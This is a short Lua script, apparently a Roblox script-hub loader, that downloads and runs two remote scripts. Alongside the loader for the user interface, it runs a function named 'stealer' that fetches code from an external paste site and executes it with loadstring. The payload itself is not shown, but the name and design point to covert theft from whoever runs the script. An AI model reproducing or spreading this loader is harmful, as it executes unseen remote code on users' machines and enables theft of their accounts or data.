local function stealer()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ZaaovmMPHU6LUPHq/raw", true))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()

end

task.spawn(stealer)
task.spawn(loadui)
